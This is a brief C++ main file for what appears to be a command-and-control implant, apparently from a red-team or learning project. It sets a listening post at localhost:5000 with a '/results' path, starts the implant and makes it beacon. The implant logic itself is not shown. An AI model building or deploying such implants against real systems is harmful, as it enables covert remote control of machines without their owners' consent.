#include <stdio.h>
#include "implant.h"
#include <boost/system/system_error.hpp>

int main()
{
    //Specify listening post endpoint configuration
    const auto host = "localhost";
    const auto port = "5000";
    const auto uri = "/results";

    Implant implant{ host, port, uri };
    implant.start();
    try {
        implant.beacon();
    }
    catch (const boost::system::system_error& se) {
        printf("\nSystem error: %s\n", se.what());
    }
}
